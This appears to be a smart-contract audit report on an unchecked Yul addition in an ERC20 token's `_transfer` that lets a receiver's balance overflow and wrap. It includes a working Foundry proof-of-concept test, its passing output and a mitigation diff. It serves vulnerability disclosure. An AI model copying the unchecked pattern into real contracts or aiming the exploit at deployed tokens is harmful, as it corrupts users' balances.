# Unchecked arithmetic in `_transfer` allows receiver balance overflow

## Root + Impact

Calling `_transfer` to an account whose balance is near `type(uint256).max` causes arithmetic overflow in Yul, wrapping the receiver's balance to a small value. This corrupts the receiver's balance accounting and enables griefing (reducing a victim's apparent balance via wrap) and desynchronization in protocols that rely on accurate balances.

## Description

- Normal behavior: Transferring tokens decreases sender's balance and increases receiver's balance by the same amount, preserving total supply.
- Issue: `_transfer` performs addition in Yul without overflow checks. When `toAmount + value > type(uint256).max`, the receiver's balance wraps around to a small number.

```solidity
// src/helpers/ERC20Internals.sol
// @_transfer: unchecked addition in Yul
100: function _transfer(address from, address to, uint256 value) internal returns (bool success) {
101:     assembly ("memory-safe") {
...
115:         let toAmount := sload(toSlot)
@>116:         sstore(toSlot, add(toAmount, value))  // No overflow check
117:         success := 1
...
121:     }
122: }
```

## Risk

**Likelihood**:

- Medium. Requires receiver to have a balance near `type(uint256).max`. This can occur naturally in high-supply tokens, or be artificially achieved through the mint overflow vulnerability or other accounting bugs.

**Impact**:

- High. Corrupts receiver balance due to wrap, causing:
  - Griefing: reducing the receiver's apparent balance when it is extremely large.
  - Accounting desync: derivative protocols relying on balance reads may report incorrect values.

## Proof of Concept

```solidity
// test/PocTransferOverflow.t.sol
// Setup: Give receiver max-1 balance; Attack: transfer 100 tokens; Assert: overflow wraps balance
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "../src/ERC20.sol";

contract TestTokenHarness is ERC20 {
    constructor() ERC20("Test", "TST") {}

    function exposedMint(address to, uint256 value) external {
        _mint(to, value);
    }
}

contract PocTransferOverflow is Test {
    TestTokenHarness private token;
    address private sender = address(0xA1);
    address private receiver = address(0xB1);

    function setUp() public {
        token = new TestTokenHarness();
        
        // Give sender 1000 tokens
        token.exposedMint(sender, 1000);
    }

    function test_TransferOverflowWrapsReceiverBalance() public {
        // Step 1: Give receiver a huge balance (max - 100)
        token.exposedMint(receiver, type(uint256).max - 100);
        
        uint256 receiverBalanceBefore = token.balanceOf(receiver);
        uint256 senderBalanceBefore = token.balanceOf(sender);
        uint256 totalSupplyBefore = token.totalSupply();
        
        // Step 2: Transfer 200 tokens from sender to receiver
        // Receiver will overflow: (max - 100) + 200 = max + 100 = wraps to 99
        vm.prank(sender);
        token.transfer(receiver, 200);
        
        uint256 receiverBalanceAfter = token.balanceOf(receiver);
        uint256 senderBalanceAfter = token.balanceOf(sender);
        uint256 totalSupplyAfter = token.totalSupply();
        
        // Assertions to prove the overflow vulnerability:
        
        // 1. Receiver's balance DECREASED instead of increased!
        assertEq(receiverBalanceAfter, 99, "receiver balance wrapped to 99");
        assertLt(receiverBalanceAfter, receiverBalanceBefore, "receiver balance decreased - WRONG!");
        
        // 2. Sender's balance correctly decreased by 200
        assertEq(senderBalanceAfter, 800, "sender balance decreased by 200");
        
        // 3. Total supply unchanged (both mints happened before, transfer doesn't affect supply)
        assertEq(totalSupplyAfter, totalSupplyBefore, "supply unchanged");
        
        // 4. Receiver's apparent balance wrapped and decreased instead of increasing, confirming accounting corruption near max.
    }
}
```

## Test result

```bash
➜  2025-12-token-0x git:(main) ✗ forge test --match-path test/PocTransferOverflow.t.sol -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/PocTransferOverflow.t.sol:PocTransferOverflow
[PASS] test_TransferOverflowWrapsReceiverBalance() (gas: 60011)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 919.00µs (375.62µs CPU time)

Ran 1 test suite in 10.94ms (919.00µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Recommended Mitigation

Add overflow check before updating receiver's balance:

```diff
 function _transfer(address from, address to, uint256 value) internal returns (bool success) {
     assembly ("memory-safe") {
         // ... sender balance checks ...
         
         let toAmount := sload(toSlot)
+        let newToAmount := add(toAmount, value)
+        // Check for overflow: if newToAmount < toAmount, overflow occurred
+        if lt(newToAmount, toAmount) {
+            mstore(0x00, shl(224, 0xe450d38c)) // ERC20InsufficientBalance or custom error
+            mstore(add(0x00, 4), to)
+            mstore(add(0x00, 0x24), toAmount)
+            mstore(add(0x00, 0x44), value)
+            revert(0x00, 0x64)
+        }
-        sstore(toSlot, add(toAmount, value))
+        sstore(toSlot, newToAmount)
         success := 1
         // ... emit event ...
     }
 }
```
